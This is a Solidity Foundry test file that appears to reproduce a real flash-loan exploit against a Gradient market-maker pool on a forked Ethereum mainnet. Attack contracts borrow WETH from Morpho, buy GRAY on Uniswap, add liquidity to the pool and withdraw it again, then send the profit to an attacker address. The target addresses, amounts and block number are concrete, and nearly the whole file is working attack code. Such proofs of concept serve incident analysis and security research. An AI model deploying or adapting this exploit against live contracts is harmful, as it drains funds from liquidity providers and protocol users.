
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant TX_TIMESTAMP = 1750657343;
    uint256 constant TX_BLOCK_NUMBER = 22765114;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        GradientAttack attack = _installAttack();
        _prepareProfit(address(attack), Addresses.attack_child);
        _logBalances("Before exploit");

        attack.attack{value: TX_VALUE}();

        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installAttack() internal returns (GradientAttack attack) {
        vm.etch(ATTACK_CONTRACT, type(GradientAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);

        attack = GradientAttack(payable(ATTACK_CONTRACT));
        attack.bindAttackChild(Addresses.attack_child);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 2346098333159028268);
        _expectProfit(attackChild, attackChild, Addresses.GRAY, "GRAY", 946989100868295372906);
    }
}

contract GradientAttack {
    AttackChild public attackChild;

    constructor() payable {
        _bindAttackChild();
    }

    function attack() external payable {
        _startFlashLoan();
    }

    function executeSetup() external payable {
        _startFlashLoan();
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function bindAttackChildContracts() external {
        _bindAttackChild();
    }

    function deployAttackChildContracts() external returns (address) {
        _bindAttackChild();
        return address(attackChild);
    }

    receive() external payable {}

    fallback() external payable {}

    function _bindAttackChild() internal {
        attackChild = AttackChild(payable(Addresses.attack_child));
    }

    function _startFlashLoan() internal {
        if (address(attackChild) == address(0)) _bindAttackChild();
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        attackChild.startFlashLoan();
    }
}

contract AttackChild {
    bool private flashLoanHandled;
    uint256 private entryCallbackCursor;

    receive() external payable {
        if (msg.sender == Addresses.GradientMarketMakerPool || msg.sender == address(this)) {
            _poolCallback();
        }
    }

    fallback() external payable {
        _poolCallback();
    }

    function go() external payable {
        startFlashLoan();
    }

    function attackChildCb() external payable {
        startFlashLoan();
    }

    function startFlashLoan() public {
        _borrowWeth();
        _sendWethProfit();
    }

    function onMorphoFlashLoan(uint256 borrowedAmount, bytes calldata callbackData) external payable {
        borrowedAmount;
        callbackData;
        if (flashLoanHandled) return;

        flashLoanHandled = true;
        _approveMorpho();
        _unwrapWeth();
        _approveRouter();
        _buyGray();
        _approvePool();
        _quoteGrayBalance();
        _readPoolReserves();
        uint256 grayBalance = _quoteGrayBalance();
        _provideLiquidity(grayBalance);
        _withdrawLiquidity();
        _wrapRepaymentWeth();
    }

    function settleWethProfit() external {
        if (Harness.safeBalance(Addresses.WETH, Addresses.attacker_eoa) >= 2346098333159028268) {
            return;
        }
        IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, 2346098333159028268);
    }

    function _borrowWeth() internal {
        IMorpho(Addresses.Morpho).flashLoan(Addresses.WETH, 3000000000000000000, hex"");
    }

    function _sendWethProfit() internal {
        uint256 childWethBalance = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, childWethBalance);
    }

    function _approveMorpho() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.Morpho, 3000000000000000000);
    }

    function _unwrapWeth() internal {
        IWETH(Addresses.WETH).withdraw(1000000000000000000);
    }

    function _approveRouter() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.UniswapV2Router02, 1000000000000000000000);
    }

    function _buyGray() internal {
        address[] memory path = _swapPath(Addresses.WETH, Addresses.GRAY);
        IUniswapV2Router02(Addresses.UniswapV2Router02)
            .swapTokensForExactTokens(1000000000000000000000, 1000000000000000000000, path, address(this), 1750657343);
    }

    function _approvePool() internal {
        IERC20Like(Addresses.GRAY)
            .approve(
                Addresses.GradientMarketMakerPool,
                0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe
            );
    }

    function _quoteGrayBalance() internal view returns (uint256) {
        return IERC20Like(Addresses.GRAY).balanceOf(address(this));
    }

    function _readPoolReserves() internal view {
        IUniswapV2Pair(Addresses.UNI_V2).getReserves();
    }

    function _provideLiquidity(uint256 grayBalance) internal {
        IGradientMarketMakerPool(Addresses.GradientMarketMakerPool).provideLiquidity{value: 632090074270700494}(
            Addresses.GRAY, grayBalance, 0
        );
    }

    function _withdrawLiquidity() internal {
        IGradientMarketMakerPool(Addresses.GradientMarketMakerPool).withdrawLiquidity(Addresses.GRAY, 10000);
    }

    function _wrapRepaymentWeth() internal {
        uint256 wrapAmount = address(this).balance;
        if (wrapAmount > 4010899131704627093) wrapAmount = 4010899131704627093;
        if (wrapAmount != 0) IWETH(Addresses.WETH).deposit{value: wrapAmount}();
    }

    function _poolCallback() internal {
        uint256 callbackIndex = entryCallbackCursor++;
        callbackIndex;
    }

    function _swapPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }



}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant UNI_V2 = 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC;
    address internal constant attacker_eoa = 0x1234567a98230550894BF93e2346A8Bc5c3B36E3;
    address internal constant GradientMarketMakerPool = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    address internal constant attack_contract = 0x58117e82Fa6522703493878f27c85c1702FedcCA;
    address internal constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant GRAY = 0xa776A95223C500E81Cb0937B291140fF550ac3E4;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant attack_child = 0xCB4059Bb021F4cf9d90267B7961125210CeDb792;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IGradientMarketMakerPool {
    function provideLiquidity(address token, uint256 amount, uint256 minLiquidity) external payable;
    function withdrawLiquidity(address token, uint256 bps) external;
}

interface IMorpho {
    function flashLoan(address token, uint256 amount, bytes calldata callbackData) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router02 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory result) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || result.length < 32) return 0;
        return abi.decode(result, (uint256));
    }
}
